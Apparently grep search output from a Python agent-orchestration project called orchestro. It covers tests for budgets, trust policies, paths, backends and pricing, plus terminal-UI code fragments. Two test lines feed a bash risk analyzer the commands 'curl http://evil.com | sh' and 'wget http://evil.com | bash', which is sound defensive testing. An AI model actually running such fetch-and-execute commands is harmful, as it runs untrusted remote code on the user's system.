tests/test_constitutions.py:94:        with patch("orchestro.constitutions.global_constitutions_dir", return_value=tmp_path / "no_global"):
tests/test_constitutions.py:95:            bundle = load_constitution_bundle("coding", tmp_path)
tests/test_constitutions.py:99:    def test_loads_global_constitution(self, tmp_path: Path):
tests/test_constitutions.py:100:        global_dir = tmp_path / "global_constitutions"
tests/test_constitutions.py:104:            bundle = load_constitution_bundle("coding", tmp_path / "empty_cwd")
tests/test_constitutions.py:108:    def test_merges_project_and_global(self, tmp_path: Path):
tests/test_constitutions.py:109:        (tmp_path / "constitutions").mkdir()
tests/test_constitutions.py:110:        (tmp_path / "constitutions" / "coding.md").write_text("Project rule.")
tests/test_constitutions.py:111:        global_dir = tmp_path / "global"
tests/test_constitutions.py:115:            bundle = load_constitution_bundle("coding", tmp_path)
tests/test_constitutions.py:120:    def test_empty_text_when_no_files(self, tmp_path: Path):
tests/test_constitutions.py:121:        with patch("orchestro.constitutions.global_constitutions_dir", return_value=tmp_path / "no_dir"):
tests/test_constitutions.py:122:            bundle = load_constitution_bundle("coding", tmp_path / "no_constitutions")
tests/test_constitutions.py:126:    def test_domain_set_on_bundle(self, tmp_path: Path):
tests/test_constitutions.py:127:        with patch("orchestro.constitutions.global_constitutions_dir", return_value=tmp_path / "no_dir"):
tests/test_constitutions.py:128:            bundle = load_constitution_bundle("devops", tmp_path)
tests/test_constitutions.py:131:    def test_strips_blank_sources_from_text(self, tmp_path: Path):
tests/test_constitutions.py:132:        (tmp_path / "constitutions").mkdir()
tests/test_constitutions.py:133:        (tmp_path / "constitutions" / "coding.md").write_text("   \n  ")  # blank content
tests/test_constitutions.py:134:        global_dir = tmp_path / "global"
tests/test_constitutions.py:138:            bundle = load_constitution_bundle("coding", tmp_path)
tests/test_collections_db.py:68:    def test_ingest_markdown_file(self, tmp_db, tmp_path):
tests/test_collections_db.py:72:        md_file = tmp_path / "sample.md"
tests/test_budget.py:11:    budget = RunBudget(max_tool_calls=5, max_tokens=1000)
tests/test_budget.py:13:    budget.tokens_used = 500
tests/test_budget.py:24:def test_check_raises_when_tokens_exceed_max():
tests/test_budget.py:25:    budget = RunBudget(max_tokens=100)
tests/test_budget.py:26:    budget.tokens_used = 200
tests/test_budget.py:27:    with pytest.raises(BudgetExhausted, match="tokens"):
tests/test_budget.py:58:    budget = RunBudget(max_tool_calls=10, max_tokens=5000, max_bash_calls=5, max_file_edits=3)
tests/test_budget.py:60:    budget.tokens_used = 2000
tests/test_budget.py:66:    assert rem["tokens"] == 3000
tests/test_budget.py:74:        "budget_max_tokens": 100_000,
tests/test_budget.py:80:    assert budget.max_tokens == 100_000
tests/test_budget.py:89:    assert budget.max_tokens == 50_000
tests/test_budget.py:101:    exc = BudgetExhausted("tokens", 1000, 1500)
tests/test_budget.py:102:    assert exc.resource == "tokens"
tests/test_budget.py:105:    assert "tokens" in str(exc)
tests/test_training_export.py:23:    def test_writes_correct_format(self, tmp_path):
tests/test_training_export.py:40:        output = tmp_path / "export.jsonl"
tests/test_training_export.py:53:    def test_writes_chat_format(self, tmp_path):
tests/test_training_export.py:57:        output = tmp_path / "sft.jsonl"
tests/test_policies.py:58:def test_load_policies_returns_defaults_when_no_file(tmp_path):
tests/test_policies.py:59:    policies = load_policies(tmp_path)
tests/test_trust.py:4:from pathlib import Path
tests/test_trust.py:44:def test_session_overrides_applied():
tests/test_trust.py:45:    policy = TrustPolicy(session_overrides={"edit_file": TRUST_CONFIRM})
tests/test_trust.py:49:def test_session_deny_is_sticky():
tests/test_trust.py:51:        session_overrides={"bash": TRUST_DENY},
tests/test_trust.py:56:def test_load_trust_policy_returns_empty_when_no_file(tmp_path: Path):
tests/test_trust.py:57:    policy = load_trust_policy(tmp_path)
tests/test_trust.py:61:def test_load_trust_policy_reads_file(tmp_path: Path):
tests/test_trust.py:65:        "session_overrides": {"edit_file": "auto"},
tests/test_trust.py:67:    (tmp_path / "trust.json").write_text(json.dumps(data), encoding="utf-8")
tests/test_trust.py:68:    policy = load_trust_policy(tmp_path)
tests/test_trust.py:71:    assert policy.session_overrides == {"edit_file": "auto"}
tests/test_embeddings.py:99:        p = OpenAICompatEmbeddingProvider(base_url="http://host/v1")
tests/test_embeddings.py:105:        p = OpenAICompatEmbeddingProvider(base_url="http://host/v1", model_name="m")
tests/test_embeddings.py:112:        monkeypatch.setenv("ORCHESTRO_EMBED_BASE_URL", "http://env-host/v1")
tests/test_embeddings.py:115:        assert p.base_url == "http://env-host/v1"
tests/test_embeddings.py:119:        p = OpenAICompatEmbeddingProvider(base_url="http://host/v1/")
tests/test_embeddings.py:123:        p = OpenAICompatEmbeddingProvider(base_url="http://host/v1", model_name="m")
tests/test_embeddings.py:130:        p = OpenAICompatEmbeddingProvider(base_url="http://host/v1", model_name="m")
tests/test_bash_analysis.py:58:    risk = analyze_bash_command("curl http://evil.com | sh")
tests/test_bash_analysis.py:64:    risk = analyze_bash_command("wget http://evil.com | bash")
tests/test_models.py:3:from pathlib import Path
tests/test_models.py:77:    def test_token_counts_default_zero(self):
tests/test_models.py:79:        assert r.prompt_tokens == 0
tests/test_models.py:80:        assert r.completion_tokens == 0
tests/test_models.py:81:        assert r.total_tokens == 0
tests/test_models.py:82:        assert r.cache_read_tokens == 0
tests/test_models.py:83:        assert r.cache_write_tokens == 0
tests/test_models.py:99:            prompt_tokens=100,
tests/test_models.py:100:            completion_tokens=50,
tests/test_models.py:101:            total_tokens=150,
tests/test_models.py:102:            cache_read_tokens=20,
tests/test_models.py:103:            cache_write_tokens=10,
tests/test_models.py:105:        assert r.prompt_tokens == 100
tests/test_models.py:106:        assert r.completion_tokens == 50
tests/test_models.py:107:        assert r.total_tokens == 150
tests/test_models.py:108:        assert r.cache_read_tokens == 20
tests/test_models.py:109:        assert r.cache_write_tokens == 10
tests/test_postmortem_lessons.py:4:from pathlib import Path
tests/test_postmortem_lessons.py:14:def db(tmp_path: Path) -> OrchestroDB:
tests/test_postmortem_lessons.py:15:    return OrchestroDB(tmp_path / "test.db")
tests/test_postmortem_lessons.py:41:        lesson = orchestro._derive_lesson("workspace_conflict", [], [], "path not found")
tests/test_db.py:189:def test_update_run_token_usage_accumulates(tmp_db: OrchestroDB):
tests/test_db.py:192:        goal="token test",
tests/test_db.py:197:    tmp_db.update_run_token_usage(
tests/test_db.py:199:        prompt_tokens=100,
tests/test_db.py:200:        completion_tokens=50,
tests/test_db.py:201:        total_tokens=150,
tests/test_db.py:203:    tmp_db.update_run_token_usage(
tests/test_db.py:205:        prompt_tokens=200,
tests/test_db.py:206:        completion_tokens=80,
tests/test_db.py:207:        total_tokens=280,
tests/test_db.py:211:    assert run.prompt_tokens == 300
tests/test_db.py:212:    assert run.completion_tokens == 130
tests/test_db.py:213:    assert run.total_tokens == 430
tests/test_paths.py:3:from pathlib import Path
tests/test_paths.py:5:from orchestro.paths import (
tests/test_paths.py:7:    db_path,
tests/test_paths.py:8:    facts_path,
tests/test_paths.py:10:    global_instructions_path,
tests/test_paths.py:12:    tool_approvals_path,
tests/test_paths.py:17:    def test_returns_path(self):
tests/test_paths.py:30:    def test_default_under_project_root(self, monkeypatch, tmp_path):
tests/test_paths.py:32:        # Patch project_root to return tmp_path so we don't pollute real .orchestro
tests/test_paths.py:33:        import orchestro.paths as paths_mod
tests/test_paths.py:34:        monkeypatch.setattr(paths_mod, "project_root", lambda: tmp_path)
tests/test_paths.py:36:        assert d == tmp_path / ".orchestro"
tests/test_paths.py:39:    def test_env_override(self, monkeypatch, tmp_path):
tests/test_paths.py:40:        target = tmp_path / "custom_home"
tests/test_paths.py:46:    def test_env_override_tilde_expanded(self, monkeypatch, tmp_path):
tests/test_paths.py:49:        monkeypatch.setenv("ORCHESTRO_HOME", str(tmp_path / "mydir"))
tests/test_paths.py:53:    def test_creates_directory(self, monkeypatch, tmp_path):
tests/test_paths.py:54:        target = tmp_path / "new_dir" / "nested"
tests/test_paths.py:61:    def test_ends_with_db_filename(self, monkeypatch, tmp_path):
tests/test_paths.py:62:        monkeypatch.setenv("ORCHESTRO_HOME", str(tmp_path))
tests/test_paths.py:63:        p = db_path()
tests/test_paths.py:65:        assert p.parent == tmp_path
tests/test_paths.py:70:        p = facts_path()
tests/test_paths.py:76:    def test_is_global_md_in_data_dir(self, monkeypatch, tmp_path):
tests/test_paths.py:77:        monkeypatch.setenv("ORCHESTRO_HOME", str(tmp_path))
tests/test_paths.py:78:        p = global_instructions_path()
tests/test_paths.py:80:        assert p.parent == tmp_path
tests/test_paths.py:84:    def test_creates_and_returns_constitutions_subdir(self, monkeypatch, tmp_path):
tests/test_paths.py:85:        monkeypatch.setenv("ORCHESTRO_HOME", str(tmp_path))
tests/test_paths.py:88:        assert d.parent == tmp_path
tests/test_paths.py:93:    def test_is_json_file_in_data_dir(self, monkeypatch, tmp_path):
tests/test_paths.py:94:        monkeypatch.setenv("ORCHESTRO_HOME", str(tmp_path))
tests/test_paths.py:95:        p = tool_approvals_path()
tests/test_paths.py:97:        assert p.parent == tmp_path
tests/conftest.py:4:from pathlib import Path
tests/conftest.py:11:def tmp_db(tmp_path: Path) -> OrchestroDB:
tests/conftest.py:12:    return OrchestroDB(tmp_path / "test.db")
tests/test_openai_compat.py:40:    prompt_tokens: int = 10,
tests/test_openai_compat.py:41:    completion_tokens: int = 5,
tests/test_openai_compat.py:42:    total_tokens: int = 15,
tests/test_openai_compat.py:46:        "prompt_tokens": prompt_tokens,
tests/test_openai_compat.py:47:        "completion_tokens": completion_tokens,
tests/test_openai_compat.py:48:        "total_tokens": total_tokens,
tests/test_openai_compat.py:129:        monkeypatch.setenv("ORCHESTRO_OPENAI_BASE_URL", "http://env:8000/v1")
tests/test_openai_compat.py:132:            base_url="http://ctor:9000/v1",
tests/test_openai_compat.py:134:            api_key="ctor-key",
tests/test_openai_compat.py:136:        assert backend.resolved_base_url() == "http://ctor:9000/v1"
tests/test_openai_compat.py:140:        monkeypatch.setenv("ORCHESTRO_OPENAI_BASE_URL", "http://env:8000/v1")
tests/test_openai_compat.py:143:        assert backend.resolved_base_url() == "http://env:8000/v1"
tests/test_openai_compat.py:147:        backend = OpenAICompatBackend(base_url="http://host:8000/v1/")
tests/test_openai_compat.py:152:# run() — success and error paths
tests/test_openai_compat.py:164:        backend = OpenAICompatBackend(base_url="http://host:8000/v1")
tests/test_openai_compat.py:169:        backend = OpenAICompatBackend(base_url="http://host:8000/v1", model="m")
tests/test_openai_compat.py:174:        assert resp.prompt_tokens == 10
tests/test_openai_compat.py:175:        assert resp.completion_tokens == 5
tests/test_openai_compat.py:176:        assert resp.total_tokens == 15
tests/test_openai_compat.py:179:        backend = OpenAICompatBackend(base_url="http://host:8000/v1", model="default-model")
tests/test_openai_compat.py:188:        backend = OpenAICompatBackend(base_url="http://host:8000/v1", model="m")
tests/test_openai_compat.py:195:        backend = OpenAICompatBackend(base_url="http://host:8000/v1", model="m")
tests/test_openai_compat.py:201:    def test_cache_read_tokens_extracted(self):
tests/test_openai_compat.py:202:        backend = OpenAICompatBackend(base_url="http://host:8000/v1", model="m")
tests/test_openai_compat.py:203:        body = _make_response_body(extra_usage={"cache_read_input_tokens": 200})
tests/test_openai_compat.py:206:        assert resp.cache_read_tokens == 200
tests/test_openai_compat.py:208:    def test_cache_write_tokens_extracted(self):
tests/test_openai_compat.py:209:        backend = OpenAICompatBackend(base_url="http://host:8000/v1", model="m")
tests/test_openai_compat.py:210:        body = _make_response_body(extra_usage={"cache_creation_input_tokens": 512})
tests/test_openai_compat.py:213:        assert resp.cache_write_tokens == 512
tests/test_openai_compat.py:215:    def test_prompt_tokens_details_cached_tokens_captured(self):
tests/test_openai_compat.py:216:        backend = OpenAICompatBackend(base_url="http://host:8000/v1", model="m")
tests/test_openai_compat.py:218:            extra_usage={"prompt_tokens_details": {"cached_tokens": 100}}
tests/test_openai_compat.py:222:        assert resp.metadata["cache_stats"]["cached_tokens"] == 100
tests/test_openai_compat.py:225:        backend = OpenAICompatBackend(base_url="http://host:8000/v1", model="m")
tests/test_openai_compat.py:229:        assert resp.cache_read_tokens == 0
tests/test_openai_compat.py:230:        assert resp.cache_write_tokens == 0
tests/test_openai_compat.py:233:        backend = OpenAICompatBackend(base_url="http://host:8000/v1", model="m")
tests/test_openai_compat.py:243:        backend = OpenAICompatBackend(base_url="http://host:8000/v1", model="mymodel")
tests/test_openai_compat.py:284:        backend = OpenAICompatBackend(base_url="http://host:8000/v1", model="m")
tests/test_openai_compat.py:291:        backend = OpenAICompatBackend(base_url="http://host:8000/v1", model="m")
tests/test_openai_compat.py:300:        backend = OpenAICompatBackend(base_url="http://host:8000/v1", model="m")
tests/test_openai_compat.py:311:        backend = OpenAICompatBackend(base_url="http://host:8000/v1", model="m")
tests/test_openai_compat.py:322:        backend = OpenAICompatBackend(base_url="http://host:8000/v1", model="m")
tests/test_openai_compat.py:335:        backend = OpenAICompatBackend(base_url="http://host:8000/v1", model="m")
tests/test_openai_compat.py:342:        backend = OpenAICompatBackend(base_url="http://host:8000/v1", model="m")
tests/test_openai_compat.py:355:        backend = OpenAICompatBackend(base_url="http://host:8000/v1", model="m")
tests/test_openai_compat.py:362:        backend = OpenAICompatBackend(base_url="http://host:8000/v1", model="m")
tests/test_openai_compat.py:370:        backend = OpenAICompatBackend(base_url="http://host:8000/v1", model="m")
tests/test_openai_compat.py:377:        backend = OpenAICompatBackend(base_url="http://host:8000/v1", model="m")
tests/test_openai_compat.py:383:    def test_completion_tokens_estimated_from_text_length(self):
tests/test_openai_compat.py:384:        backend = OpenAICompatBackend(base_url="http://host:8000/v1", model="m")
tests/test_openai_compat.py:385:        # 100 chars → at least 1 token
tests/test_openai_compat.py:390:        assert resp.completion_tokens >= 1
tests/test_openai_compat.py:399:        backend = OpenAICompatBackend(base_url="http://host:8000/v1", model="m")
tests/test_openai_compat.py:406:        backend = OpenAICompatBackend(base_url="http://host:8000/v1", model="mymodel")
tests/test_pricing.py:1:"""Tests for token pricing model in budget.py."""
tests/test_pricing.py:40:        # For most providers, completion tokens cost more than prompt tokens.
tests/test_pricing.py:47:    def test_zero_tokens_is_zero_cost(self) -> None:
tests/test_pricing.py:48:        cost = estimate_cost(prompt_tokens=0, completion_tokens=0, backend_name="claude-sonnet")
tests/test_pricing.py:53:            prompt_tokens=100_000,
tests/test_pricing.py:54:            completion_tokens=50_000,
tests/test_pricing.py:62:            prompt_tokens=1_000_000,
tests/test_pricing.py:63:            completion_tokens=1_000_000,
tests/test_pricing.py:69:        kwargs = dict(prompt_tokens=10_000, completion_tokens=5_000)
tests/test_pricing.py:75:        base = estimate_cost(prompt_tokens=1000, completion_tokens=500, backend_name="claude-sonnet")
tests/test_pricing.py:76:        double = estimate_cost(prompt_tokens=2000, completion_tokens=1000, backend_name="claude-sonnet")
tests/test_pricing.py:83:            prompt_tokens=1000,
tests/test_pricing.py:84:            completion_tokens=500,
tests/test_pricing.py:91:            prompt_tokens=1000,
tests/test_pricing.py:92:            completion_tokens=500,
tests/test_pricing.py:97:    def test_cache_tokens_shown_when_nonzero(self) -> None:
tests/test_pricing.py:99:            prompt_tokens=100,
tests/test_pricing.py:100:            completion_tokens=50,
tests/test_pricing.py:101:            cache_read_tokens=200,
tests/test_pricing.py:102:            cache_write_tokens=100,
tests/test_pricing.py:108:    def test_cache_tokens_hidden_when_zero(self) -> None:
tests/test_pricing.py:110:            prompt_tokens=100,
tests/test_pricing.py:111:            completion_tokens=50,
tests/test_pricing.py:116:    def test_token_counts_in_output(self) -> None:
tests/test_pricing.py:118:            prompt_tokens=1234,
tests/test_pricing.py:119:            completion_tokens=567,
tests/test_subprocess_backend.py:5:from pathlib import Path
tests/test_subprocess_backend.py:51:# _resolved_command / _resolved_shell
tests/test_subprocess_backend.py:70:    def test_shell_constructor_flag(self):
tests/test_subprocess_backend.py:71:        backend = SubprocessCommandBackend(shell=True)
tests/test_subprocess_backend.py:72:        assert backend._resolved_shell() is True
tests/test_subprocess_backend.py:74:    def test_shell_env_flag_true(self, monkeypatch):
tests/test_subprocess_backend.py:77:        assert backend._resolved_shell() is True
tests/test_subprocess_backend.py:79:    def test_shell_env_flag_1(self, monkeypatch):
tests/test_subprocess_backend.py:82:        assert backend._resolved_shell() is True
tests/test_subprocess_backend.py:84:    def test_shell_env_flag_false_by_default(self, monkeypatch):
tests/test_subprocess_backend.py:87:        assert backend._resolved_shell() is False
tests/test_subprocess_backend.py:95:    def test_returns_none_when_no_command(self, monkeypatch, tmp_path):
tests/test_subprocess_backend.py:98:        result = backend.start(_request(working_directory=tmp_path))
tests/test_subprocess_backend.py:101:    def test_returns_handle_when_command_set(self, tmp_path):
tests/test_subprocess_backend.py:103:        handle = backend.start(_request(working_directory=tmp_path))
tests/test_subprocess_backend.py:107:    def test_handle_is_subprocess_handle(self, tmp_path):
tests/test_subprocess_backend.py:109:        handle = backend.start(_request(working_directory=tmp_path))
tests/test_subprocess_backend.py:115:# run() — success and failure paths
tests/test_subprocess_backend.py:119:    def test_run_missing_command_raises(self, monkeypatch, tmp_path):
tests/test_subprocess_backend.py:123:            backend.run(_request(working_directory=tmp_path))
tests/test_subprocess_backend.py:125:    def test_run_success_captures_stdout(self, tmp_path):
tests/test_subprocess_backend.py:127:        resp = backend.run(_request(working_directory=tmp_path))
tests/test_subprocess_backend.py:130:    def test_run_nonzero_exit_raises(self, tmp_path):
tests/test_subprocess_backend.py:133:            backend.run(_request(working_directory=tmp_path))
tests/test_subprocess_backend.py:135:    def test_run_stderr_included_in_error(self, tmp_path):
tests/test_subprocess_backend.py:138:            backend.run(_request(working_directory=tmp_path))
tests/test_subprocess_backend.py:140:    def test_run_metadata_includes_backend_name(self, tmp_path):
tests/test_subprocess_backend.py:142:        resp = backend.run(_request(working_directory=tmp_path))
tests/test_subprocess_backend.py:152:    def test_goal_injected(self, tmp_path):
tests/test_subprocess_backend.py:156:        resp = backend.run(_request(goal="my task", working_directory=tmp_path))
tests/test_subprocess_backend.py:159:    def test_strategy_injected(self, tmp_path):
tests/test_subprocess_backend.py:163:        resp = backend.run(_request(strategy_name="tool-loop", working_directory=tmp_path))
tests/test_subprocess_backend.py:166:    def test_system_prompt_injected(self, tmp_path):
tests/test_subprocess_backend.py:170:        resp = backend.run(_request(system_prompt="Be brief.", working_directory=tmp_path))
tests/test_subprocess_backend.py:173:    def test_prompt_context_injected(self, tmp_path):
tests/test_subprocess_backend.py:177:        resp = backend.run(_request(prompt_context="Here is context.", working_directory=tmp_path))
tests/test_subprocess_backend.py:180:    def test_domain_injected_from_metadata(self, tmp_path):
tests/test_subprocess_backend.py:184:        resp = backend.run(_request(metadata={"domain": "coding"}, working_directory=tmp_path))
tests/test_subprocess_backend.py:187:    def test_domain_empty_string_when_absent(self, tmp_path):
tests/test_subprocess_backend.py:191:        resp = backend.run(_request(metadata={}, working_directory=tmp_path))
tests/test_subprocess_backend.py:194:    def test_parent_run_id_injected(self, tmp_path):
tests/test_subprocess_backend.py:198:        resp = backend.run(_request(parent_run_id="abc-123", working_directory=tmp_path))
tests/test_subprocess_backend.py:201:    def test_parent_run_id_empty_when_none(self, tmp_path):
tests/test_subprocess_backend.py:205:        resp = backend.run(_request(parent_run_id=None, working_directory=tmp_path))
tests/test_subprocess_backend.py:208:    def test_workdir_injected(self, tmp_path):
tests/test_subprocess_backend.py:212:        resp = backend.run(_request(working_directory=tmp_path))
tests/test_subprocess_backend.py:213:        assert resp.output_text == str(tmp_path)
tests/test_facts_file.py:3:from pathlib import Path
tests/test_facts_file.py:104:    def test_writes_file(self, tmp_path: Path):
tests/test_facts_file.py:105:        p = tmp_path / "facts.md"
tests/test_facts_file.py:110:    def test_overwrites_existing(self, tmp_path: Path):
tests/test_facts_file.py:111:        p = tmp_path / "facts.md"
tests/test_facts_file.py:118:    def test_empty_list_writes_placeholder(self, tmp_path: Path):
tests/test_facts_file.py:119:        p = tmp_path / "facts.md"
tests/test_fact_review.py:4:from pathlib import Path
tests/test_fact_review.py:13:def db(tmp_path: Path) -> OrchestroDB:
tests/test_fact_review.py:14:    return OrchestroDB(tmp_path / "test.db")
docs/backends-and-routing.md:72:- backend execution honors that model when the backend supports it
docs/backends-and-routing.md:156:- Codex uses `codex exec`
tests/test_query_classifier.py:62:                avg_tokens=1000,
tests/test_retrieval.py:4:from pathlib import Path
tests/test_retrieval.py:15:def db(tmp_path: Path) -> OrchestroDB:
tests/test_retrieval.py:16:    return OrchestroDB(tmp_path / "test.db")
tests/test_retrieval.py:131:    def test_normalize_text_lowercases_and_tokenizes(self, builder: RetrievalBuilder) -> None:
src/orchestro/constitutions.py:4:from pathlib import Path
src/orchestro/constitutions.py:6:from orchestro.paths import global_constitutions_dir
src/orchestro/constitutions.py:12:    path: str
src/orchestro/constitutions.py:26:                {"label": source.label, "path": source.path}
src/orchestro/constitutions.py:36:    project_path = find_project_constitution(domain, cwd)
src/orchestro/constitutions.py:37:    if project_path is not None:
src/orchestro/constitutions.py:41:                path=str(project_path),
src/orchestro/constitutions.py:42:                content=project_path.read_text(encoding="utf-8"),
src/orchestro/constitutions.py:45:    global_path = global_constitutions_dir() / f"{domain}.md"
src/orchestro/constitutions.py:46:    if global_path.exists():
src/orchestro/constitutions.py:50:                path=str(global_path),
src/orchestro/constitutions.py:51:                content=global_path.read_text(encoding="utf-8"),
src/orchestro/constitutions.py:60:        path = candidate / "constitutions" / f"{domain}.md"
src/orchestro/constitutions.py:61:        if path.exists():
src/orchestro/constitutions.py:62:            return path
src/orchestro/tui.py:7:from pathlib import Path
src/orchestro/tui.py:37:def format_session_line(session: object, *, selected: bool = False) -> str:
src/orchestro/tui.py:39:    status = getattr(session, "status", "?")
src/orchestro/tui.py:40:    title = _clip(getattr(session, "title", None) or getattr(session, "id", "?"), 46)
src/orchestro/tui.py:80:        return "Plan mode: create or refine tasks, then use palette or buttons to advance execution."
src/orchestro/tui.py:85:    if view_mode == "sessions":
src/orchestro/tui.py:86:        return "Session mode: continue the selected thread or switch to runs/plans for active execution."
src/orchestro/tui.py:97:    if busy and view_mode in {"runs", "sessions"}:
src/orchestro/tui.py:138:    sessions: list[object],
src/orchestro/tui.py:145:    session_index: int,
src/orchestro/tui.py:173:    elif view_mode == "sessions":
src/orchestro/tui.py:174:        if not sessions:
src/orchestro/tui.py:175:            lines.append("  no sessions")
src/orchestro/tui.py:178:                f"  {format_session_line(session, selected=index == session_index)}"
src/orchestro/tui.py:179:                for index, session in enumerate(sessions[:10])
src/orchestro/tui.py:247:        ("sessions", "Sessions"),
src/orchestro/tui.py:333:            f"Active execution on {selected}. Watch execution timeline, touched files, and result stream while the run "
src/orchestro/tui.py:425:        ("ws-sessions", "sessions", "Sessions"),
src/orchestro/tui.py:492:    if mode == "sessions":
src/orchestro/tui.py:494:            "wc-1": ("Edit Title", "edit-session-title", True),
src/orchestro/tui.py:495:            "wc-2": ("Edit Summary", "edit-session-summary", True),
src/orchestro/tui.py:496:            "wc-3": ("Archive", "archive-session", True),
src/orchestro/tui.py:497:            "wc-4": ("Activate", "activate-session", True),
src/orchestro/tui.py:556:    sessions: list[object],
src/orchestro/tui.py:557:    session_index: int,
src/orchestro/tui.py:583:    elif mode == "sessions":
src/orchestro/tui.py:584:        start, end = _window(len(sessions), session_index)
src/orchestro/tui.py:586:            label = _clip(getattr(sessions[index], "title", None) or getattr(sessions[index], "id", "?"), 18)
src/orchestro/tui.py:587:            items.append((label, f"select-session:{index}", index == session_index))
src/orchestro/tui.py:660:    sessions: list[object],
src/orchestro/tui.py:665:    session_index: int,
src/orchestro/tui.py:671:        "runs": ("[RUNS]", " sessions ", " plans ", " approvals ", " jobs ", " review ", " integrations ", " activity "),
src/orchestro/tui.py:672:        "sessions": (" runs ", "[SESSIONS]", " plans ", " approvals ", " jobs ", " review ", " integrations ", " activity "),
src/orchestro/tui.py:673:        "plans": (" runs ", " sessions ", "[PLANS]", " approvals ", " jobs ", " review ", " integrations ", " activity "),
src/orchestro/tui.py:674:        "approvals": (" runs ", " sessions ", " plans ", "[APPROVALS]", " jobs ", " review ", " integrations ", " activity "),
src/orchestro/tui.py:675:        "jobs": (" runs ", " sessions ", " plans ", " approvals ", "[JOBS]", " review ", " integrations ", " activity "),
src/orchestro/tui.py:676:        "review": (" runs ", " sessions ", " plans ", " approvals ", " jobs ", "[REVIEW]", " integrations ", " activity "),
src/orchestro/tui.py:677:        "integrations": (" runs ", " sessions ", " plans ", " approvals ", " jobs ", " review ", "[INTEGRATIONS]", " activity "),
src/orchestro/tui.py:678:        "activity": (" runs ", " sessions ", " plans ", " approvals ", " jobs ", " review ", " integrations ", "[ACTIVITY]"),
src/orchestro/tui.py:680:    tab_runs, tab_sessions, tab_plans, tab_approvals, tab_jobs, tab_review, tab_integrations, tab_activity = labels.get(mode, labels["runs"])
src/orchestro/tui.py:682:        f"{tab_runs}  {tab_sessions}  {tab_plans}",
src/orchestro/tui.py:692:    elif mode == "sessions":
src/orchestro/tui.py:693:        if not sessions:
src/orchestro/tui.py:694:            lines.extend(["No sessions yet.", "Create or accumulate one from shell/API flows."])
src/orchestro/tui.py:697:                format_session_line(session, selected=index == session_index)
src/orchestro/tui.py:698:                for index, session in enumerate(sessions)
src/orchestro/tui.py:718:            lines.extend(["No shell jobs.", "Background and approval-gated jobs appear here."])
src/orchestro/tui.py:792:def format_session_detail(session: object | None, runs: list[object]) -> str:
src/orchestro/tui.py:793:    if session is None:
src/orchestro/tui.py:798:                "No session selected.",
src/orchestro/tui.py:799:                "Press 2 to switch to the session navigator.",
src/orchestro/tui.py:805:        f"id: {getattr(session, 'id', '-')}",
src/orchestro/tui.py:806:        f"title: {getattr(session, 'title', None) or '-'}",
src/orchestro/tui.py:807:        f"status: {getattr(session, 'status', '-')}",
src/orchestro/tui.py:808:        f"parent: {getattr(session, 'parent_session_id', None) or '-'}",
src/orchestro/tui.py:809:        f"fork run: {getattr(session, 'fork_point_run_id', None) or '-'}",
src/orchestro/tui.py:810:        f"updated: {getattr(session, 'updated_at', '-')}",
src/orchestro/tui.py:813:    if getattr(session, "summary", None):
src/orchestro/tui.py:814:        lines.extend(["summary:", str(getattr(session, "summary")), ""])
src/orchestro/tui.py:815:    if getattr(session, "context_snapshot", None):
src/orchestro/tui.py:816:        lines.extend(["context snapshot:", str(getattr(session, "context_snapshot")), ""])
src/orchestro/tui.py:817:    lines.append("session runs:")
src/orchestro/tui.py:829:            "  session-title <text>",
src/orchestro/tui.py:830:            "  session-summary <text>",
src/orchestro/tui.py:831:            "  archive-session",
src/orchestro/tui.py:832:            "  activate-session",
src/orchestro/tui.py:995:        f"tokens: {getattr(run, 'total_tokens', 0)}",
src/orchestro/tui.py:1107:        "session-title": "Editing session title",
src/orchestro/tui.py:1108:        "session-summary": "Editing session summary",
src/orchestro/tui.py:1120:    if mode in {"session-summary", "plan-add-inline", "plan-edit-inline"}:
src/orchestro/tui.py:1122:        if mode == "session-summary":
src/orchestro/tui.py:1129:    if mode.startswith("session-") and context.get("session_id"):
src/orchestro/tui.py:1130:        lines.append(f"session: {context['session_id']}")
src/orchestro/tui.py:1520:    ] or ["No execution trace yet."]
src/orchestro/tui.py:1783:        return compose_workspace([format_card("Act", ["No active execution."])])
src/orchestro/tui.py:1827:                or ["No execution steps yet."],
src/orchestro/tui.py:2158:    sessions: list[object],
src/orchestro/tui.py:2207:        f"sessions: {len(sessions)}",
src/orchestro/tui.py:2212:        f"session: {_clip(getattr(sessions[0], 'title', None) or getattr(sessions[0], 'id', '-'), 34) if sessions else '-'}",
src/orchestro/tui.py:2232:    session_count: int,
src/orchestro/tui.py:2246:        f" runs {run_count} | sessions {session_count} | plans {plan_count} | selected {selected}"
src/orchestro/tui.py:2572:            ("2", "switch_sessions", "Sessions"),
src/orchestro/tui.py:2603:        selected_session_index = reactive(0)
src/orchestro/tui.py:2613:            self._sessions: list[object] = []
src/orchestro/tui.py:2646:                yield Button("Sessions", id="ws-sessions", classes="workspace-btn")
src/orchestro/tui.py:2691:                placeholder="Palette: focus runs|sessions|plans|approvals|jobs|review | approve | deny | pause | resume | cancel | refresh",
src/orchestro/tui.py:2717:        def action_switch_sessions(self) -> None:
src/orchestro/tui.py:2718:            self.view_mode = "sessions"
src/orchestro/tui.py:2851:            elif self.view_mode == "sessions" and self._sessions:
src/orchestro/tui.py:2852:                self.selected_session_index = min(len(self._sessions) - 1, self.selected_session_index + 1)
src/orchestro/tui.py:2871:            elif self.view_mode == "sessions" and self._sessions:
src/orchestro/tui.py:2872:                self.selected_session_index = max(0, self.selected_session_index - 1)
src/orchestro/tui.py:2892:            if self.view_mode == "sessions":
src/orchestro/tui.py:2893:                session = self._selected_session()
src/orchestro/tui.py:2894:                if session is None:
src/orchestro/tui.py:2895:                    self._last_error = "no session selected"
src/orchestro/tui.py:2899:                    mode="session-title",
src/orchestro/tui.py:2900:                    value=str(getattr(session, "title", None) or ""),
src/orchestro/tui.py:2901:                    placeholder="Edit session title and press Enter to save",
src/orchestro/tui.py:2902:                    context={"session_id": getattr(session, "id")},
src/orchestro/tui.py:2943:            if self.view_mode != "sessions":
src/orchestro/tui.py:2945:            session = self._selected_session()
src/orchestro/tui.py:2946:            if session is None:
src/orchestro/tui.py:2947:                self._last_error = "no session selected"
src/orchestro/tui.py:2951:                mode="session-summary",
src/orchestro/tui.py:2952:                value=str(getattr(session, "summary", None) or ""),
src/orchestro/tui.py:2953:                placeholder="Edit session summary and press Enter to save",
src/orchestro/tui.py:2954:                context={"session_id": getattr(session, "id")},
src/orchestro/tui.py:2981:                self._execute_palette_command(command_text)
src/orchestro/tui.py:3001:                "focus sessions",
src/orchestro/tui.py:3016:                "session-title updated session title",
src/orchestro/tui.py:3017:                "session-summary concise summary",
src/orchestro/tui.py:3034:                "archive-session",
src/orchestro/tui.py:3035:                "activate-session",
